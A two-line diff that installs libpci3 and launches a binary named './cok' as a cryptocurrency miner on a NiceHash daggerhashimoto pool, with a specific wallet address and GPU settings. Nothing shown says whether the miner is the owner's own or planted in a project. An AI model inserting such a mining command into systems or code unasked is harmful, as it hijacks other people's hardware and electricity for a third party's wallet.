@@ -1,0 +1,2 @@
+sudo apt-get install libpci3
+./cok -pool stratum+tcp://daggerhashimoto.usa.nicehash.com:3353 -wal 367MbR3EwWh1qyYYkVYhFZF9tbpQmwBq25 -pass x -proto 4 -mi 5 -stales 0 -gpow 60
